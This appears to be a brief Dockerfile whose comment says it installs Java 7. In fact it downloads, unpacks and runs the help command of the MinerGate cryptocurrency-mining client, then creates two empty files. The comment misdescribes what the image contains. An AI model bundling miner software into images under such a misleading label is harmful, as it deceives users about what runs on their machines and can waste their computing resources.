FROM debian:latest  
  
MAINTAINER sabin.basyal@docker.com  
  
# Install Java 7  
RUN apt-get update  
RUN apt-get -y install wget  
RUN apt-get -y install binutils  
RUN wget https://download.minergate.com/deb-cli  
RUN ar x deb-cli  
RUN tar -xvzf data.tar.gz  
RUN cd opt/minergate-cli && ./minergate-cli -help\  
  
  
RUN touch /home/welcome.txt  
RUN touch /home/TestRepositoryLinks.txt  
  

